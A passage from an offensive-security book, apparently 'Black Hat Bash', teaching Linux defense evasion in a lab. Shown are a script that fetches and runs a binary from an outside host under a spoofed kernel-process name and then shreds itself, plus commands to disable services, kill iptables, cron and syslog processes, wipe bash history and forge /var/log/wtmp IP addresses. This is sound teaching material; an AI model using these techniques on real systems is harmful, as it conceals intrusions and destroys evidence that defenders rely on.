<pre class="pre"><code>#!/bin/bash&#13;
WORK_DIR="/tmp"&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]"&#13;
"[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> RANDOMIZE=$((RANDOM % 7))&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"&#13;
FULL_BIN_PATH="${WORK_DIR}/${BIN_FILE}"&#13;
&#13;
self_removal(){&#13;
  shred -u -- "$(basename "$0")" &amp;&amp; rm -f -- "${FULL_BIN_PATH}"&#13;
}&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation4">❹</span> if command -v curl 1&gt; /dev/null; then&#13;
<span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> curl -s "http://172.16.10.1:8080/system_sleep" -o "${FULL_BIN_PATH}"&#13;
  if [[-s "${FULL_BIN_PATH}"]]; then&#13;
    chmod +x "${FULL_BIN_PATH}"&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation6">❻</span> export PATH="${WORK_DIR}:${PATH}"&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation7">❼</span> nohup "${BIN_FILE}" &amp;&gt; /dev/null &amp;&#13;
  fi&#13;
fi&#13;
&#13;
<span class="codeannotated_CodeAnnotation">8</span> trap self_removal EXIT&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-3: Process masquerading by rotating process names</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_291" aria-label="291"/>At <span class="CodeAnnotation" aria-label="annotation1">❶</span>, we define the <span class="SANS_TheSansMonoCd_W5Regular_11">RANDOM_BIN_NAMES</span> array, which contains arbitrary process names surrounded by square brackets. The names have tiny changes that make them harder to distinguish from common system processes (such as <span class="SANS_TheSansMonoCd_W5Regular_11">ipv8_addrconf</span> instead of <span class="SANS_TheSansMonoCd_W5Regular_11">ipv6_addrconf</span>). This array represents the list of possible process names the script will select from.</p>&#13;
<p class="TX">We then generate a random number from 0 to 7 with the <span class="SANS_TheSansMonoCd_W5Regular_11">RANDOM</span> environment variable and the modulo (<span class="SANS_TheSansMonoCd_W5Regular_11">%</span>) operator <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We’ll use the selected value as the array index number to choose the binary name <span class="CodeAnnotation" aria-label="annotation3">❸</span>. For example, if the random number is 2, we select the name from the array by using <span class="SANS_TheSansMonoCd_W5Regular_11">RANDOM_BIN_NAMES[2]</span>.</p>&#13;
<p class="TX">Next, we check whether the <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> command is available <span class="CodeAnnotation" aria-label="annotation4">❹</span> so that the script won’t proceed if it’s missing. At <span class="CodeAnnotation" aria-label="annotation5">❺</span>, we download a binary named <span class="SANS_TheSansMonoCd_W5Regular_11">system_sleep</span> from Kali and save it into <i>/tmp</i>. We modify the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> environment variable to include the current working directory defined in <span class="SANS_TheSansMonoCd_W5Regular_11">WORK_DIR</span> (<i>/tmp</i>) as the first directory in the search path <span class="CodeAnnotation" aria-label="annotation6">❻</span>, then execute the binary file and send it to the background <span class="CodeAnnotation" aria-label="annotation7">❼</span>. For testing purposes, the binary merely executes <span class="SANS_TheSansMonoCd_W5Regular_11">sleep 100</span>.</p>&#13;
<p class="TX">Finally, we use the sigspec <span class="SANS_TheSansMonoCd_W5Regular_11">EXIT</span> at <span class="CodeAnnotation" aria-label="annotation8">❽</span> to call the <span class="SANS_TheSansMonoCd_W5Regular_11">self_removal()</span> function. This function ensures that we perform a self-deletion of the script after it exits with the <span class="SANS_TheSansMonoCd_W5Regular_11">shred -u</span> command. The <span class="SANS_TheSansMonoCd_W5Regular_11">EXIT</span> signal ensures that the file will be removed even if any errors occur in the script.</p>&#13;
<p class="TX">Before running this script, make <span class="SANS_TheSansMonoCd_W5Regular_11">system_sleep</span> available to the 172.16.10.0/24 network from the Kali machine. The following commands compile <span class="SANS_TheSansMonoCd_W5Regular_11">system_sleep</span>:</p>&#13;
<pre><code>$ <b>cd ~/Black-Hat-Bash/ch12</b>&#13;
$ <b>gcc system_sleep.c -o system_sleep</b>&#13;
$ <b>ls -ld system_sleep</b>&#13;
&#13;
-rwxrwxr-x 1 kali 15968 Dec  3 14:20 system_sleep&#13;
</code></pre>&#13;
<p class="TX">Next, start an HTTP server from the same directory:</p>&#13;
<pre><code>$ <b>python3 -m http.server 8080</b></code></pre>&#13;
<p class="TX">Copy the script to <i>p-jumpbox-01</i> (172.16.10.13) or <i>p-web-01</i> (172.16.10.10) to see it in action. When you run it, you should see output similar to the following in the process list:</p>&#13;
<pre><code>$ <b>bash binary_name_rotation.sh</b>&#13;
$ <b>ps aux</b>&#13;
&#13;
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND&#13;
root           1  0.0  0.0   2752   972 ?        Ss   Nov30   0:00 /bin/sh -c service ssh re...&#13;
root          17  0.0  0.1  14924  4716 ?        Ss   Nov30   0:00 sshd: /usr/sbin/sshd [lis...&#13;
root          29  0.0  0.0   3760  2316 ?        Ss   Nov30   0:03 /usr/sbin/cron -P&#13;
root          30  0.0  0.0   2684   904 ?        S    Nov30   0:23 tail -f /dev/null&#13;
root       28050  0.0  0.0   4612  3760 pts/1    Ss   17:49   0:00 bash&#13;
<b>root       28772  0.0  0.0   2484  1352 pts/1    S    19:25   0:00 [kstrrp]</b>&#13;
root       28775  0.0  0.0   2732   860 pts/1    S    19:25   0:00 sh -c sleep 100&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_292" aria-label="292"/>You could expand this script by adding logic to detect the distribution on which it’s being executed, then choosing a process name commonly seen on that distribution.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h2 class="H1" id="sec11"><span id="h1-101"/><span class="SANS_Futura_Std_Bold_B_11">Dropping Files in Shared Memory</span></h2>&#13;
<p class="TNI1">The <i>/dev/shm</i> directory provides shared memory that processes can use to communicate data with one another. These shared memory objects exist until the system shuts down or processes unmap them, and they’re subject to the same security risks as the other shared mounts discussed in <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>The following commands are not supported within the lab environment but can be tested within your Kali virtual machine.</i></p>&#13;
<p class="TX">Usually, systems mount <i>/dev/shm</i> by using security-related flags to prevent possible abuse. The command in <a href="chapter12.xhtml#Lis12-4">Listing 12-4</a> shows what a <i>/dev/shm</i> mount with the <span class="SANS_TheSansMonoCd_W5Regular_11">noexec</span> flag might look like.</p>&#13;
<span id="Lis12-4"/><pre><code>$ <b>mount | grep "/dev/shm"</b>&#13;
&#13;
shm on /dev/shm type tmpfs (rw,<b>nosuid,nodev,noexec</b>,relatime,size=65536k,inode64)&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-4: Listing the</span> <span class="SANS_Futura_Std_Book_11">/dev/shm</span> <span class="Futura_Std_Book_Oblique_I">mount flags</span></p>&#13;
<p class="TX">You can also read this information directly from the <i>/proc/self/mountinfo</i> file (<a href="chapter12.xhtml#Lis12-5">Listing 12-5</a>).</p>&#13;
<span id="Lis12-5"/><pre><code>$ <b>grep /dev/shm /proc/self/mountinfo</b>&#13;
&#13;
964 959 0:104 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-5: Listing mount information via</span> <span class="SANS_Futura_Std_Book_11">/proc</span></p>&#13;
<p class="TX">As you can see, <i>/dev/shm</i> is often mounted using the <span class="SANS_TheSansMonoCd_W5Regular_11">noexec</span> option by default, which doesn’t allow the execution of binary files from within the directory. If you wanted to drop a binary there and execute it, you’d have to remount <i>/dev/shm</i>, which requires having root access. You can do so with the <span class="SANS_TheSansMonoCd_W5Regular_11">mount -o remount</span> command, as in <a href="chapter12.xhtml#Lis12-6">Listing 12-6</a>.</p>&#13;
<span id="Lis12-6"/><pre><code># <b>mount -o "remount,$(mount | grep shm | grep -oP '\(\K[^\)]+' | sed</b> <b>s'/noexec/exec/')" /dev/shm</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-6: Remounting</span> <span class="SANS_Futura_Std_Book_11">/dev/shm</span> <span class="Futura_Std_Book_Oblique_I">with custom flags</span></p>&#13;
<p class="TX">You’ve preserved the existing mount options but swapped <span class="SANS_TheSansMonoCd_W5Regular_11">noexec</span> with <span class="SANS_TheSansMonoCd_W5Regular_11">exec</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h2 class="H1" id="sec12"><span id="h1-102"/><span class="SANS_Futura_Std_Bold_B_11">Disabling Runtime Security Controls</span></h2>&#13;
<p class="TNI1">You can disable security controls if you’ve managed to compromise a system’s root account. Keep in mind, however, that stopping services will most likely trigger alerts. In this section, we cover several ways of stopping services.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_293" aria-label="293"/>To check the status of a service, use the <span class="SANS_TheSansMonoCd_W7Bold_B_11">service</span> command with the <span class="SANS_TheSansMonoCd_W7Bold_B_11">--status-all</span> option (<a href="chapter12.xhtml#Lis12-7">Listing 12-7</a>).</p>&#13;
<span id="Lis12-7"/><pre><code># <b>service --status-all</b>&#13;
&#13;
 [-]  atd&#13;
 [+]  cron&#13;
 [-]  dbus&#13;
 [?]  hwclock.sh&#13;
 [-]  postfix&#13;
 [-]  procps&#13;
 [+]  ssh&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-7: Listing available services</span></p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">[?]</span> symbol means the service status isn’t known, <span class="SANS_TheSansMonoCd_W5Regular_11">[+]</span> means the service is currently running, and <span class="SANS_TheSansMonoCd_W5Regular_11">[-]</span> means the service is stopped.</p>&#13;
<p class="TX">To stop a service, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">service</span> <span class="SANS_TheSansMonoCd_W7Bold_Italic_BI_11">servicename</span> <span class="SANS_TheSansMonoCd_W7Bold_B_11">stop</span> command (<a href="chapter12.xhtml#Lis12-8">Listing 12-8</a>).</p>&#13;
<span id="Lis12-8"/><pre><code># <b>service atd stop</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-8: Stopping a service</span></p>&#13;
<p class="TX">In <span class="Xref"><a href="chapter10.xhtml">Chapter 10</a></span>, we mentioned that systemd-based systems can use the <span class="SANS_TheSansMonoCd_W5Regular_11">systemctl</span> command for service control. On Kali, list the available services with the command in <a href="chapter12.xhtml#Lis12-9">Listing 12-9</a>.</p>&#13;
<span id="Lis12-9"/><pre><code># <b>systemctl list-units --type=service</b>&#13;
&#13;
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION&#13;
  atd.service                 loaded active running Deferred execution scheduler&#13;
  colord.service              loaded active running Manage, install and generate color profiles&#13;
  console-setup.service       loaded active exited  Set console font and keymap&#13;
  containerd.service          loaded active running containerd container runtime&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-9: Listing services by using systemctl</span></p>&#13;
<p class="TX">To stop a service, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">systemctl stop</span> <span class="SANS_TheSansMonoCd_W7Bold_Italic_BI_11">servicename</span>, as in <a href="chapter12.xhtml#Lis12-10">Listing 12-10</a>.</p>&#13;
<span id="Lis12-10"/><pre><code># <b>systemctl stop cron</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-10: Stopping a service by using systemctl</span></p>&#13;
<p class="TX">Note that some services are configured to run on boot, meaning they start whenever the system has been rebooted. You can try to disable this behavior by passing the <span class="SANS_TheSansMonoCd_W5Regular_11">disable</span> command to <span class="SANS_TheSansMonoCd_W5Regular_11">systemctl</span> (<a href="chapter12.xhtml#Lis12-11">Listing 12-11</a>).</p>&#13;
<span id="Lis12-11"/><pre><code># <b>systemctl disable atd</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-11: Disabling a service with systemctl</span></p>&#13;
<p class="TX">On some systems, such as the Red Hat–based distribution CentOS or older versions of Red Hat Enterprise Linux, you may need to use the <span class="SANS_TheSansMonoCd_W5Regular_11">chkconfig</span> command to disable a service from starting on boot (<a href="chapter12.xhtml#Lis12-12">Listing 12-12</a>).</p>&#13;
<span id="Lis12-12"/><pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_294" aria-label="294"/># <b>chkconfig atd off</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-12: Disabling a service with chkconfig</span></p>&#13;
<p class="TX">Messing with security tool processes will raise suspicion and likely start an incident investigation. Instead of relying on specific tools to terminate a process, you could iterate over process names of interest and run the <span class="SANS_TheSansMonoCd_W5Regular_11">kill</span> command against the PIDs (<a href="chapter12.xhtml#Lis12-13">Listing 12-13</a>).</p>&#13;
<span id="Lis12-13"/><pre><code>$ <b>for pid in $(ps -ef | grep -e "iptables" -e "cron" -e "syslog" |</b>&#13;
<b>awk '{print $2}'); do kill -9 "${pid}"; done</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-13: Killing a list of processes with a for loop</span></p>&#13;
<p class="TX">Note that this method is not graceful and could lead to undesirable results. Use it with caution.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h2 class="H1" id="sec13"><span id="h1-103"/><span class="SANS_Futura_Std_Bold_B_11">Manipulating History</span></h2>&#13;
<p class="TNI1">In previous chapters, we discussed the <i>.bash_history</i> file in each user’s home directory, which contains commands executed by local users. By disabling this behavior, attackers can hide their activities on the target system. The bash shell has a handful of environment variables that control the behavior of command execution tracking in history files:</p>&#13;
<p class="RunInPara1"><span class="SANS_TheSansMonoCd_W7Bold_B_11">HISTSIZE</span> Determines the number of commands that can be cached in memory.</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">HISTFILE</span> Determines the path to the history file on the filesystem (for example, <i>/home/user/.bash_history</i>).</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">HISTFILESIZE</span> Determines the number of commands that the <i>.bash _history</i> file can store on disk.</p>&#13;
<p class="RunInPara"><span class="SANS_TheSansMonoCd_W7Bold_B_11">HISTCONTROL</span> Controls the saving of commands in the history list by using multiple values separated by colons (<span class="SANS_TheSansMonoCd_W5Regular_11">:</span>). The value <span class="SANS_TheSansMonoCd_W5Regular_11">ignorespace</span> excludes lines starting with a space character from the history list, <span class="SANS_TheSansMonoCd_W5Regular_11">ignoredups</span> prevents the saving of lines matching the previous entry, and <span class="SANS_TheSansMonoCd_W5Regular_11">ignoreboth</span> combines both <span class="SANS_TheSansMonoCd_W5Regular_11">ignorespace</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">ignoredups</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">erasedups</span> value removes all previous occurrences of the current line from the history file before saving it.</p>&#13;
<p class="RunInPara2"><span class="SANS_TheSansMonoCd_W7Bold_B_11">HISTIGNORE</span> Defines command-matching patterns so that specific commands aren’t added to the history file.</p>&#13;
<p class="TX">If you set the <span class="SANS_TheSansMonoCd_W5Regular_11">ignorespace</span> value for the <span class="SANS_TheSansMonoCd_W5Regular_11">HISTCONTROL</span> variable, you can prepend a space character to your commands to keep them out of the history file (<a href="chapter12.xhtml#Lis12-14">Listing 12-14</a>).</p>&#13;
<span id="Lis12-14"/><pre><code>$ <b>export HISTCONTROL=ignorespace</b>&#13;
$  <b>echo hello world  # echo is prepended with a space.</b>&#13;
&#13;
hello world&#13;
$ <b>history | tail -5</b>&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_295" aria-label="295"/>38  ps aux&#13;
39  clear&#13;
40  history | tail -5&#13;
41  export HISTCONTROL=ignorespace&#13;
42  history | tail -5&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-14: Hiding a command from the history file by beginning it with a space</span></p>&#13;
<p class="TX">To clear the command history for the current user, run the commands in <a href="chapter12.xhtml#Lis12-15">Listing 12-15</a>.</p>&#13;
<span id="Lis12-15"/><pre><code>$ <b>history -c &amp;&amp; history -w</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-15: Clearing the history</span></p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">history -c</span> command clears the history, while the <span class="SANS_TheSansMonoCd_W5Regular_11">-w</span> option writes the current history to the history file.</p>&#13;
<p class="TX">To disable command history tracking for the current user, use the commands in <a href="chapter12.xhtml#Lis12-16">Listing 12-16</a>. These will affect the current session only.</p>&#13;
<span id="Lis12-16"/><pre><code>$ <b>export HISTSIZE=0 &amp;&amp; export HISTFILE=/dev/null</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-16: Setting the history size and file for the current session</span></p>&#13;
<p class="TX">To disable command history tracking across all sessions, add these commands to the <i>~/.bashrc</i> file.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h2 class="H1" id="sec14"><span id="h1-104"/><span class="SANS_Futura_Std_Bold_B_11">Tampering with Session Metadata</span></h2>&#13;
<p class="TNI1">In <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>, we explored log entries related to connected, disconnected, and failed login sessions by using tools such as <span class="SANS_TheSansMonoCd_W5Regular_11">last</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">lastb</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">w</span>, and <span class="SANS_TheSansMonoCd_W5Regular_11">who</span>. These commands read from logfiles usually stored in the <i>/var/log</i> and <i>/var/run</i> directories. With the correct permissions, we can manipulate these files in an attempt to alter information about sessions, such as IP addresses, dates, and times.</p>&#13;
<p class="TX">As an example, let’s modify a logfile to change our source IP address. In Kali, open a terminal tab and, as the backup user, SSH into the <i>p-jumpbox-01</i> machine with the following command:</p>&#13;
<pre><code>$ <b>ssh backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">Next, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">last</span> command to see metadata about the last connected session:</p>&#13;
<pre><code>$ <b>last</b>&#13;
&#13;
backup   pts/1        <b>172.16.10.1</b>      Thu Dec  7 03:31    gone - no logout&#13;
wtmp begins Thu Dec  7 03:31:28&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_296" aria-label="296"/>As you can see, the source IP address is that of the Kali machine (172.16.10.1). Open a second terminal and SSH into <i>p-jumpbox-01</i>, now using the <i>root</i> user:</p>&#13;
<pre><code>$ <b>ssh root@172.16.10.13</b></code></pre>&#13;
<p class="TX">Next, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">xxd</span> command to dump <i>/var/log/wtmp</i> in hexadecimal:</p>&#13;
<pre><code># <b>xxd /var/log/wtmp</b>&#13;
&#13;
00000000: 0700 0000 3bf3 0000 7074 732f 3100 0000  ....;...pts/1...&#13;
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................&#13;
00000020: 0000 0000 0000 0000 7473 2f31 6261 636b  ........ts/1back&#13;
00000030: 7570 0000 0000 0000 0000 0000 0000 0000  up..............&#13;
00000040: 0000 0000 0000 0000 0000 0000 3137 322e  ............172.&#13;
00000050: <b>3136</b> 2e31 302e 3100 0000 0000 0000 0000  16.10.1.........&#13;
</code></pre>&#13;
<p class="TX">The <i>/var/log/wtmp</i> file structure is fragile; the wrong modifications can render it completely unreadable. Using the following command, change the source IP address from 172.16.10.1 to 172.50.10.1, modifying only 2 bytes (<a href="chapter12.xhtml#Lis12-17">Listing 12-17</a>).</p>&#13;
<span id="Lis12-17"/><pre><code># <b>sed -i s'/\x31\x36/\x35\x30/'g /var/log/wtmp</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-17: Replacing hexadecimal characters with sed</span></p>&#13;
<p class="TX">Using the backup user, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">last</span> command again to see the changes:</p>&#13;
<pre><code>$ <b>last</b>&#13;
&#13;
backup   pts/1        <b>172.50.10.1</b>      Thu Dec  7 03:31    gone - no logout&#13;
</code></pre>&#13;
<p class="TX">To go further, try modifying the output of the <span class="SANS_TheSansMonoCd_W5Regular_11">lastb</span> command by altering the <i>/var/log/btmp</i> file:</p>&#13;
<pre><code>$ <b>lastb</b>&#13;
&#13;
idontexit ssh:notty    172.16.10.1      Thu Dec  7 03:54 - 03:54  (00:00)&#13;
backup    ssh:notty    172.16.10.1      Thu Dec  7 03:30 - 03:30  (00:00)&#13;
</code></pre>&#13;
<p class="TX">To see information when <span class="SANS_TheSansMonoCd_W5Regular_11">lastb</span> is executed, you’ll need to attempt to access the machine by using the wrong credentials at least once. For example, try using SSH as a nonexistent user, such as <span class="SANS_TheSansMonoCd_W5Regular_11">ssh idontexist@172.16.10.13</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h2 class="H1" id="sec15"><span id="h1-105"/><span class="SANS_Futura_Std_Bold_B_11">Concealing Data</span></h2>&#13;
<p class="TNI1">The security controls on a corporate network attempt to protect sensitive information from unauthorized disclosure, leakage, or loss. Thus, covert operations frequently seek to hide the sensitive information with which they <span role="doc-pagebreak" epub:type="pagebreak" id="pg_297" aria-label="297"/>interact. Attackers can encode, obfuscate, and encrypt data by using industry-standard tools or custom algorithms.</p>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h2-177"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Encoding</span></h3>&#13;
<p class="TNI1"><i>Data encoding</i> is the process of converting information from one format to another. Digital communications often use encoding to represent data in a scheme that allows it to be transmitted, stored, or processed. As you’ve seen throughout this book, bash provides built-in support for base64 encoding with the <span class="SANS_TheSansMonoCd_W5Regular_11">base64</span> command. Using <span class="SANS_TheSansMonoCd_W5Regular_11">echo</span>, you can pipe a string to <span class="SANS_TheSansMonoCd_W5Regular_11">base64</span> to get the encoded version:</p>&#13;
<pre><code>$ <b>echo -n "Secret Data" | base64</b>&#13;
&#13;
U2VjcmV0IERhdGE=&#13;
</code></pre>&#13;
<p class="TX">To decode this information, just pass the <span class="SANS_TheSansMonoCd_W5Regular_11">-d</span> parameter to <span class="SANS_TheSansMonoCd_W5Regular_11">base64</span>:</p>&#13;
<pre><code>$ <b>echo "U2VjcmV0IERhdGE=" | base64 -d</b>&#13;
&#13;
Secret Data&#13;
</code></pre>&#13;
<p class="TX">We can encode the same string more than once with bash. Using multiple rounds of encoding provides additional layers of obfuscation, possibly frustrating whoever is trying to recover the original string. In <a href="chapter12.xhtml#Lis12-18">Listing 12-18</a>, we encode the string <span class="SANS_TheSansMonoCd_W5Regular_11">Hello!</span> 10 times.</p>&#13;
<span id="Lis12-18"/><pre><code>$ <b>text="Hello!"</b>&#13;
$ <b>rounds=10; for i in $(seq ${rounds}); do text="$(echo "${text}" | base64)"; done</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-18: Performing several rounds of base64 encoding with a for loop</span></p>&#13;
<p class="TX">To decode the string, use the same number of rounds when encoding (<a href="chapter12.xhtml#Lis12-19">Listing 12-19</a>).</p>&#13;
<span id="Lis12-19"/><pre><code>$ <b>echo $text</b>&#13;
&#13;
Vm0wd2QyVkZOVWRXV0doVFYwZDRWRll3Wkc5WFZsbDNXa1JTVjJKR2JETlhhMUpUVmpGYWRHVkdX&#13;
bFpOYWtFeFZtMTRZV014WkhWaApSbHBPWVd0RmVGWnNVa2RaVjFKSFZtNUdVd3BpU0VKdldWaHdW&#13;
MlZXV25OV2JVWmFWbXh3ZVZSc1duTldkM0JwVW01Q1ZWZFhkRmRYCmJWWnpWMnhXVldKWVVuSlph&#13;
MVpMVlRGc2RXSXpaRlJrTWpnNVEyYzlQUW89Cg==&#13;
&#13;
$ <b>rounds=10; for i in $(seq ${rounds}); do text="$(echo "${text}" | base64 -d)"; done</b>&#13;
$ <b>echo $text</b>&#13;
&#13;
Hello!&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-19: Decoding a multiple-encoded string</span></p>&#13;
<p class="TX">We can also use the <span class="SANS_TheSansMonoCd_W5Regular_11">xxd</span> command line utility to convert data to hexadecimal (<a href="chapter12.xhtml#Lis12-20">Listing 12-20</a>).</p>&#13;
<span id="Lis12-20"/><pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_298" aria-label="298"/>$ <b>echo -n "Secret Data" | xxd -p</b>&#13;
&#13;
5365637265742044617461&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-20: Converting ASCII characters to hexadecimal</span></p>&#13;
<p class="TX">To decode the hexadecimal data by using bash, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">xxd -r -p</span> (<a href="chapter12.xhtml#Lis12-21">Listing 12-21</a>).</p>&#13;
<span id="Lis12-21"/><pre><code>$ <b>echo "5365637265742044617461" | xxd -r -p</b>&#13;
&#13;
Secret Data&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-21: Converting hexadecimal back to ASCII</span></p>&#13;
<p class="TX">We can combine encoding schemes by piping their outputs. <a href="chapter12.xhtml#Lis12-22">Listing 12-22</a> pipes base64-encoded output into the hexadecimal encoding function.</p>&#13;
<span id="Lis12-22"/><pre><code>$ <b>echo "Secret Data" | xxd -p | base64</b>&#13;
NTM2NTYzNzI2NTc0MjA0NDYxNzQ2MTBhCg==&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-22: Base64 encoding a hexadecimal string</span></p>&#13;
<p class="TX">However, encoded data is easy to decode if you know the algorithm used. Encryption mechanisms provide stronger protection.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h3 class="H2" id="sec17"><span id="h2-178"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Encryption</span></h3>&#13;
<p class="TNI1"><i>Encryption</i> is the process of converting <i>plaintext</i>, or the original data, into <i>ciphertext</i>, or encrypted data, using a cryptographic algorithm. The goal of encryption is to scramble information to make it unreadable. This could bypass security controls that inspect data for malicious signatures.</p>&#13;
<p class="TX"><i>OpenSSL</i>, a commonly used encryption tool, provides a wide range of cryptographic functions. <a href="chapter12.xhtml#Lis12-23">Listing 12-23</a> shows how to encrypt sensitive information by using bash and OpenSSL. We encrypt the plaintext <i>Black Hat Bash</i> by using the encryption algorithm AES-256, then encode the output by using base64.</p>&#13;
<span id="Lis12-23"/><pre><code>$ <b>MY_SECRET="Black Hat Bash"</b>&#13;
$ <b>echo "${MY_SECRET}" | openssl enc -aes256 -pbkdf2 -base64</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-23: Encrypting text with OpenSSL</span></p>&#13;
<p class="TX">You should be prompted to enter a password twice. In this case, we use <i>nostarch</i> as the password. OpenSSL should then output the ciphertext:</p>&#13;
<pre><code>enter AES-256-CBC encryption password:&#13;
Verifying - enter AES-256-CBC encryption password:&#13;
&#13;
U2FsdGVkX18u2T5pZ+owj/NU0Y8e6 + 2uCZQa2agr5WI=&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_299" aria-label="299"/>To decrypt the ciphertext, supply the password with the <span class="SANS_TheSansMonoCd_W5Regular_11">-d</span> parameter (<a href="chapter12.xhtml#Lis12-24">Listing 12-24</a>).</p>&#13;
<span id="Lis12-24"/><pre><code>$ <b>echo "U2FsdGVkX18u2T5pZ+owj/NU0Y8e6</b> <b>+ 2uCZQa2agr5WI=" | openssl aes-256-cbc -d -pbkdf2 -base64</b>&#13;
enter AES-256-CBC decryption password:&#13;
Black Hat Bash&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-24: Decrypting the ciphertext</span></p>&#13;
<p class="TX">This should output the original message.</p>&#13;
<p class="HeadAExercise"><span id="exe-28"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 28: Writing Substitution Cipher Functions</span></p>&#13;
<p class="TNI1">In this exercise, you’ll scramble text by using a simple substitution cipher, <i>ROT13</i>, which encrypts text by shifting each character in a message by 13 letters in the alphabet. For example, <i>a</i> becomes <i>n</i>, and <i>n</i> becomes <i>a</i>. To the human eye, the resulting ciphertext won’t make a lot of sense. For example, consider the character substitutions for <i>No Starch Press</i> (<a href="chapter12.xhtml#fig12-1">Figure 12-1</a>).</p>&#13;
<figure class="IMG"><img id="fig12-1" class="img5" src="../images/pg299.jpg" alt=""/>&#13;
